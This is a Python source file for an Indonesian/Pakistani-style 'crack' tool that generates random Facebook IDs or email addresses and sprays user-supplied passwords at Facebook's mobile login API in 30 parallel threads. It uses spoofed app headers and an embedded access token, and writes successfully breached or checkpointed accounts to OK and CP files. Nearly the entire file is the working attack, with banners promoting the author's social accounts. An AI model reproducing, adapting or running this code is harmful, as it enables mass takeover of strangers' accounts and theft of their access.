# -*- coding: utf-8
import os
try:
	import requests
except ImportError:
	print("\n [!] \033[0;91mmodule requests belum terinstall \033[0;97m")
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] \033[0;91mmodule futures belum terinstall\033[0;97m")
	os.system("pip install futures")
	os.system("pkg install figlet")

import os
import sys
import time
import calendar
import requests
import random
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from datetime import date 

def sangar():
        m = ["|","/","-","\\"]
        for b in range(2):
                for t in m:
                        sys.stdout.write("  \r\033[32m"+t)
                        #os.system("rm -rf login.txt")
                        sys.stdout.flush()
                        time.sleep(1)       
  
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		                                              
ct = datetime.now()
n = ct.month
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}


class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		self.ips = requests.get("https://anggakurniawan.my.id/myip/").text
		os.system("clear")
		jalan(" ••• please subscribe youtube author :) thank you")
		os.system("xdg-open https://youtube.com/channel/UCMxnS8H31SIU2Q7AwDpdBmw")
		time.sleep(4)
		os.system("clear")
		os.system("figlet HAMII")
		print("\n  ( Programmed By Hamid Meer )") 
		print("\n  ( Facebook : Hamid Meer'hamii )") 
		print("\n  ( WhatsApp +923155912839 )") 
		print(" ( https://github.com/Hamii-King-06 )\n") 
		
		print("         [ No Login Facebook ]")
		print(" -------------------------------------")

		print(" -------------------------------------")
		print("\n [01]. crack random id facebook new")
		print(" [02]. crack random id facebook young")
		print(" [03]. crack random id facebook old")
		print(" [04]. crack random email facebook")
		print(" [05]. report")
		tanya = input("\n [•] choose : ")
		if tanya in ["", " "]:
			Main()
		elif tanya in ["1", "01"]:
			self.fbbaru()
		elif tanya in ["2", "02"]:
			self.fbmuda()
		elif tanya in ["3", "03"]:
			self.fbtua()
		elif tanya in ["4", "04"]:
			self.email()
		elif tanya in ["5", "05"]:	
		    os.system(" xdg-open https://www.facebook.com/H4CK3R.H4M11")
		    time.sleep(3)		    		   
		    Main()
		else:
			Main()

	def fbbaru(self):
		x = 11111111111
		xx = 77777777777
		idx = "1000" 
		limit = int(input(" [•] enter the number of id\n [•] Example < 5000 > : "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print(" [•] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [•] use comma <,> for separator\n [•] Example  : 123456,123456789")
				listpass = input(" [•] enter password : ")
				if len(listpass)<=5:
					exit("\n [•] Password minimum 6 characters")
				print(" [•] crack with password -> [\033[0;91m%s\033[0;97m]"%(listpass))
				print("\n [•] ok results stored in -> OK-"+tgl)
				print(" [•] cp results stored in -> CP-"+tgl)
				print(" [•] if no result, turn on airplane mode 5 seconds")
				print(" [•] re-login cp account in 7 days\n")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [•] Done...")
		except Exception as e:exit(str(e))
	
	def fbmuda(self):
		x = 1111111111
		xx = 9999999999
		idx = "10000" 
		limit = int(input(" [•] enter the number of id\n [•] Example < 5000 > : "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print(" [•] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [•] use comma <,> for separator\n [•] Example  : 123456,123456789")
				listpass = input(" [•] enter password : ")
				if len(listpass)<=5:
					exit("\n [•] Password minimum 6 characters")
				print(" [•] crack with password -> [\033[0;91m%s\033[0;97m]"%(listpass))
				print("\n [•] ok results stored in -> OK-"+tgl)
				print(" [•] cp results stored in -> CP-"+tgl)
				print(" [•] if no result, turn on airplane mode 5 seconds")
				print(" [•] re-login cp account in 7 days\n")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [•] Done...")
		except Exception as e:exit(str(e))

	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		limit = int(input(" [•] enter the number of id\n [•] Example < 5000 > : "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print(" [•] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [•] use comma <,> for separator\n [•] Example  : 123456,123456789")
				listpass = input(" [•] enter password : ")
				if len(listpass)<=5:
					exit("\n [•] Password minimum 6 characters")
				print(" [•] crack with password -> [\033[0;91m%s\033[0;97m]"%(listpass))
				print("\n [•] ok results stored in -> OK-"+tgl)
				print(" [•] cp results stored in -> CP-"+tgl)
				print(" [•] if no result, turn on airplane mode 5 seconds")
				print(" [•] re-login cp account in 7 days\n")
				#fake()
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [•] Done...")
		except Exception as e:exit(str(e))

	def email(self):
		x = 111
		xx = 999
		nama = input(" [•] enter name\n [•] Example < alex > : ")
		nama = nama.replace(" ", "")
		domain = input(" [•] [G]mail.com, [Y]ahoo.com, [H]otmail.com : ")
		if domain in [""]:Main()
		elif domain in ["G", "g"]:
			idx = "@gmail.com"
		elif domain in ["Y", "y"]:
			idx = "@yahoo.com"
		elif domain in ["H", "h"]:
			idx = "@hotmail.com"
		else:Main()
		limit = int(input(" [•] enter the number of id\n [•] Example < 5000 > : "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				___ = nama
				self.id.append(___+str(_)+__)
			print(" [•] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [•] use comma <,> for separator\n [•] Example  : 123456,123456789")
				listpass = input(" [•] enter password : ")
				if len(listpass)<=5:
					exit("\n [•] Password minimum 6 characters")
				print(" [•] crack with password -> [\033[0;91m%s\033[0;97m]"%(listpass))
				print("\n [•] ok results stored in -> OK-"+tgl)
				print(" [•] cp results stored in -> CP-"+tgl)
				print(" [•] if no result, turn on airplane mode 5 seconds")
				print(" [•] re-login cp account in 7 days\n")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [•] Done...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r [CRACK] %s/%s -> [HAMII-OK]:-%s - [HAMII-CP]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[HAMII-CP] %s • %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s • %s"%(uid, pw))
				open("OK-"+tgl+".txt","a").write("%s | %s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[HAMII-CP] %s • %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s • %s"%(uid, pw))
				open("CP-"+tgl+".txt","a").write("%s | %s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print(" [•] GITHUB : https://github.com/Hamii-king-06")
		exit()
	else:
		Main()

try:Main()
except Exception as e:exit(str(e))


